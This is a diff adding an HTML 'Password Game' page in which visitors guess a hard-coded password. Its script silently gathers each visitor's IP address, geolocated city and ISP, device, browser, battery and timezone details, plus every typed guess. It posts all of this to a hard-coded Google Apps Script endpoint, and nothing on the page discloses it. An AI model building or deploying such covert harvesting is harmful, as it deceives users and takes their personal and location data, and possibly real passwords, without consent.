@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Password Game</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            font-weight: 300;
+            line-height: 1.2;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #555;
+            font-weight: 500;
+            font-size: 1.1em;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            outline: none;
+            box-sizing: border-box;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+
+        input[type="password"]:focus {
+            border-color: #667eea;
+            transform: scale(1.02);
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            width: 100%;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        /* Touch-friendly button for mobile */
+        @media (hover: none) and (pointer: coarse) {
+            button:hover {
+                transform: none;
+                box-shadow: none;
+            }
+            
+            button:active {
+                transform: scale(0.98);
+                box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+            }
+        }
+
+        .result {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 10px;
+            font-weight: 500;
+            display: none;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .result.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .result.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .attempts {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+            word-wrap: break-word;
+        }
+
+        .strength-meter {
+            margin-top: 10px;
+            height: 8px;
+            background: #e1e5e9;
+            border-radius: 4px;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .strength-fill {
+            height: 100%;
+            transition: width 0.3s ease, background-color 0.3s ease;
+            border-radius: 4px;
+        }
+
+        .strength-weak { background: #dc3545; }
+        .strength-medium { background: #ffc107; }
+        .strength-strong { background: #28a745; }
+
+        /* Mobile Responsive Design */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+                border-radius: 15px;
+                max-width: 100%;
+                width: calc(100% - 20px);
+            }
+
+            h1 {
+                font-size: 2em;
+                margin-bottom: 25px;
+            }
+
+            .form-group {
+                margin-bottom: 20px;
+            }
+
+            label {
+                font-size: 1em;
+                margin-bottom: 8px;
+            }
+
+            input[type="password"] {
+                padding: 12px 15px;
+                font-size: 16px; /* Prevents zoom on iOS */
+                border-radius: 8px;
+            }
+
+            button {
+                padding: 12px 20px;
+                font-size: 16px;
+                border-radius: 8px;
+                min-height: 48px; /* Touch-friendly minimum height */
+            }
+
+            .result {
+                margin-top: 25px;
+                padding: 15px;
+                font-size: 14px;
+            }
+
+            .attempts {
+                margin-top: 15px;
+                font-size: 13px;
+            }
+
+            .strength-meter {
+                height: 6px;
+                margin-top: 8px;
+            }
+        }
+
+        /* Small Mobile Devices */
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+
+            .container {
+                padding: 25px 15px;
+                margin: 5px;
+                border-radius: 12px;
+            }
+
+            h1 {
+                font-size: 1.8em;
+                margin-bottom: 20px;
+            }
+
+            input[type="password"] {
+                padding: 10px 12px;
+            }
+
+            button {
+                padding: 10px 15px;
+                min-height: 44px;
+            }
+
+            .result {
+                padding: 12px;
+                font-size: 13px;
+            }
+        }
+
+        /* Extra Small Mobile Devices */
+        @media (max-width: 360px) {
+            .container {
+                padding: 20px 12px;
+            }
+
+            h1 {
+                font-size: 1.6em;
+                margin-bottom: 18px;
+            }
+
+            input[type="password"] {
+                padding: 8px 10px;
+                font-size: 15px;
+            }
+
+            button {
+                padding: 8px 12px;
+                font-size: 15px;
+                min-height: 40px;
+            }
+        }
+
+        /* Landscape Mobile */
+        @media (max-width: 768px) and (orientation: landscape) {
+            body {
+                padding: 10px;
+            }
+
+            .container {
+                padding: 20px 15px;
+                max-width: 90%;
+            }
+
+            h1 {
+                font-size: 1.8em;
+                margin-bottom: 15px;
+            }
+
+            .form-group {
+                margin-bottom: 15px;
+            }
+        }
+
+        /* High DPI Displays */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            .container {
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            }
+        }
+
+        /* Dark Mode Support */
+        @media (prefers-color-scheme: dark) {
+            .container {
+                background: #1a1a1a;
+                color: #ffffff;
+            }
+
+            h1 {
+                color: #ffffff;
+            }
+
+            label {
+                color: #cccccc;
+            }
+
+            input[type="password"] {
+                background: #2a2a2a;
+                border-color: #444444;
+                color: #ffffff;
+            }
+
+            input[type="password"]:focus {
+                border-color: #667eea;
+                background: #333333;
+            }
+
+            .result.success {
+                background: #1e4d2b;
+                color: #d4edda;
+                border-color: #2d5a3d;
+            }
+
+            .result.error {
+                background: #4d1e1e;
+                color: #f8d7da;
+                border-color: #5a2d2d;
+            }
+
+            .attempts {
+                color: #aaaaaa;
+            }
+        }
+
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Password Game</h1>
+        
+        <form id="passwordForm">
+            <div class="form-group">
+                <label for="passwordInput">Enter your password guess:</label>
+                <input type="password" id="passwordInput" placeholder="Type your guess here..." required>
+                <div class="strength-meter">
+                    <div class="strength-fill" id="strengthFill"></div>
+                </div>
+            </div>
+            
+            <button type="submit">Submit Guess</button>
+        </form>
+
+        <div id="result" class="result"></div>
+        <div id="attempts" class="attempts"></div>
+    </div>
+
+    <script>
+        const correctPassword = "Shravan@1234";
+        let attempts = 0;
+        let webAppUrl = '';
+        let userData = {};
+
+        // DOM elements
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordForm = document.getElementById('passwordForm');
+        const resultDiv = document.getElementById('result');
+        const attemptsDiv = document.getElementById('attempts');
+        const strengthFill = document.getElementById('strengthFill');
+
+        // Set the web app URL automatically
+        webAppUrl = 'https://script.google.com/macros/s/AKfycbxE_o9N-zakTd6VLr8_QpcdMi1FM5i7rIH_EjBO5t0VeIy1PHripqdQHKjHjAKiOug5pg/exec';
+
+        // Initialize data collection silently
+        initializeDataCollection();
+
+        function initializeDataCollection() {
+            // Collect all user data silently in the background
+            collectUserData();
+            
+            // Log initial data to sheets automatically
+            logToSheets('Initial Data Collection', 'Initial user data collection', 'Initial', 0, false);
+        }
+
+        async function collectUserData() {
+            // IP Address & Location Data
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+                
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                userData.city = locationData.city || 'Unknown';
+                userData.region = locationData.region || 'Unknown';
+                userData.country = locationData.country_name || 'Unknown';
+                userData.isp = locationData.org || 'Unknown';
+            } catch (error) {
+                userData.ip = 'Unknown';
+                userData.city = 'Unknown';
+                userData.region = 'Unknown';
+                userData.country = 'Unknown';
+                userData.isp = 'Unknown';
+            }
+
+            // Browser Information
+            const userAgent = navigator.userAgent;
+            const browserInfo = getBrowserInfo(userAgent);
+            userData.browser = browserInfo.name;
+            userData.browserVersion = browserInfo.version;
+            userData.language = navigator.language || 'Unknown';
+            userData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Device Information
+            userData.deviceType = getDeviceType();
+            userData.operatingSystem = getOperatingSystem(userAgent);
+            userData.screenResolution = `${screen.width}x${screen.height}`;
+
+            // Battery Information
+            await getBatteryInfo();
+            
+            // Dark Mode Detection
+            userData.darkMode = detectDarkMode();
+            
+            // Copy-Paste Detection
+            userData.copyPasteEnabled = detectCopyPaste();
+        }
+
+        function getBrowserInfo(userAgent) {
+            let name = 'Unknown';
+            let version = 'Unknown';
+            
+            if (userAgent.includes('Chrome')) {
+                name = 'Chrome';
+                version = userAgent.match(/Chrome\/(\d+)/)?.[1] || 'Unknown';
+            } else if (userAgent.includes('Firefox')) {
+                name = 'Firefox';
+                version = userAgent.match(/Firefox\/(\d+)/)?.[1] || 'Unknown';
+            } else if (userAgent.includes('Safari')) {
+                name = 'Safari';
+                version = userAgent.match(/Version\/(\d+)/)?.[1] || 'Unknown';
+            } else if (userAgent.includes('Edge')) {
+                name = 'Edge';
+                version = userAgent.match(/Edge\/(\d+)/)?.[1] || 'Unknown';
+            }
+            
+            return { name, version };
+        }
+
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            const screenWidth = screen.width;
+            
+            if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+                if (screenWidth >= 768) return 'Tablet';
+                return 'Mobile';
+            }
+            
+            return 'Desktop/Laptop';
+        }
+
+        function getOperatingSystem(userAgent) {
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac')) return 'macOS';
+            if (userAgent.includes('Linux')) return 'Linux';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iOS')) return 'iOS';
+            return 'Unknown';
+        }
+
+
+
+        async function getBatteryInfo() {
+            try {
+                // Try the modern Battery Status API
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    userData.batteryLevel = Math.round(battery.level * 100) + '%';
+                    userData.batteryCharging = battery.charging;
+                } else {
+                    // Fallback for browsers that don't support Battery API
+                    userData.batteryLevel = 'Not Supported';
+                    userData.batteryCharging = 'Not Supported';
+                }
+            } catch (error) {
+                // Handle any errors gracefully
+                userData.batteryLevel = 'Error';
+                userData.batteryCharging = 'Error';
+            }
+        }
+
+        function detectDarkMode() {
+            // Check for dark mode preference
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                return 'Dark Mode';
+            } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
+                return 'Light Mode';
+            } else {
+                return 'Unknown';
+            }
+        }
+
+        function detectCopyPaste() {
+            // Check if copy-paste is enabled by testing clipboard API
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                return 'Enabled';
+            } else {
+                return 'Disabled';
+            }
+        }
+
+
+
+        async function logToSheets(guess, similarity, feedback, attemptNumber, isCorrect) {
+
+            const timestamp = new Date().toISOString();
+            const data = {
+                timestamp: timestamp,
+                guess: guess,
+                similarity: similarity,
+                feedback: feedback,
+                attemptNumber: attemptNumber,
+                isCorrect: isCorrect,
+                // Essential User Data
+                ip: userData.ip,
+                city: userData.city,
+                region: userData.region,
+                country: userData.country,
+                isp: userData.isp,
+                deviceType: userData.deviceType,
+                operatingSystem: userData.operatingSystem,
+                browser: userData.browser,
+                browserVersion: userData.browserVersion,
+                screenResolution: userData.screenResolution,
+                language: userData.language,
+                timezone: userData.timezone,
+                batteryLevel: userData.batteryLevel,
+                batteryCharging: userData.batteryCharging,
+                darkMode: userData.darkMode,
+                copyPasteEnabled: userData.copyPasteEnabled
+            };
+
+            try {
+                const response = await fetch(webAppUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Error logging to sheets:', error);
+            }
+        }
+
+        // Password strength indicator
+        passwordInput.addEventListener('input', function() {
+            const password = this.value;
+            const strength = calculatePasswordStrength(password);
+            updateStrengthMeter(strength);
+        });
+
+        function calculatePasswordStrength(password) {
+            let score = 0;
+            
+            if (password.length >= 8) score += 25;
+            if (/[a-z]/.test(password)) score += 25;
+            if (/[A-Z]/.test(password)) score += 25;
+            if (/[0-9]/.test(password)) score += 25;
+            if (/[^A-Za-z0-9]/.test(password)) score += 25;
+            
+            return Math.min(score, 100);
+        }
+
+        function updateStrengthMeter(strength) {
+            strengthFill.style.width = strength + '%';
+            strengthFill.className = 'strength-fill';
+            
+            if (strength < 40) {
+                strengthFill.classList.add('strength-weak');
+            } else if (strength < 80) {
+                strengthFill.classList.add('strength-medium');
+            } else {
+                strengthFill.classList.add('strength-strong');
+            }
+        }
+
+        // Form submission
+        passwordForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const guessedPassword = passwordInput.value;
+            attempts++;
+            
+            const isCorrect = guessedPassword === correctPassword;
+            const similarity = calculateSimilarity(guessedPassword, correctPassword);
+            const feedback = getSimilarityFeedback(similarity);
+            
+            if (isCorrect) {
+                showResult('success', '🎉 Congratulations! You guessed the password correctly!');
+            } else {
+                showResult('error', '❌ Incorrect password! Try again.');
+            }
+            
+            // Log to Google Sheets with all user data
+            await logToSheets(guessedPassword, similarity + '%', feedback, attempts, isCorrect);
+            
+            updateAttempts();
+            passwordInput.value = '';
+            updateStrengthMeter(0);
+        });
+
+        function showResult(type, message) {
+            resultDiv.className = `result ${type}`;
+            resultDiv.textContent = message;
+            resultDiv.style.display = 'block';
+        }
+
+        function calculateSimilarity(str1, str2) {
+            const longer = str1.length > str2.length ? str1 : str2;
+            const shorter = str1.length > str2.length ? str2 : str1;
+            
+            if (longer.length === 0) return 100;
+            
+            const editDistance = levenshteinDistance(longer, shorter);
+            return Math.round(((longer.length - editDistance) / longer.length) * 100);
+        }
+
+        function levenshteinDistance(str1, str2) {
+            const matrix = [];
+            
+            for (let i = 0; i <= str2.length; i++) {
+                matrix[i] = [i];
+            }
+            
+            for (let j = 0; j <= str1.length; j++) {
+                matrix[0][j] = j;
+            }
+            
+            for (let i = 1; i <= str2.length; i++) {
+                for (let j = 1; j <= str1.length; j++) {
+                    if (str2.charAt(i - 1) === str1.charAt(j - 1)) {
+                        matrix[i][j] = matrix[i - 1][j - 1];
+                    } else {
+                        matrix[i][j] = Math.min(
+                            matrix[i - 1][j - 1] + 1,
+                            matrix[i][j - 1] + 1,
+                            matrix[i - 1][j] + 1
+                        );
+                    }
+                }
+            }
+            
+            return matrix[str2.length][str1.length];
+        }
+
+        function getSimilarityFeedback(similarity) {
+            if (similarity >= 90) return "Very close! You're almost there!";
+            if (similarity >= 70) return "Getting warmer! Keep trying!";
+            if (similarity >= 50) return "Not too far off, but needs work.";
+            if (similarity >= 30) return "Quite different, but you're on the right track.";
+            return "Very different guess. Try a different approach!";
+        }
+
+        function updateAttempts() {
+            attemptsDiv.textContent = `Attempts: ${attempts}`;
+        }
+
+        // Initialize
+        updateAttempts();
+    </script>
+</body>
+</html>
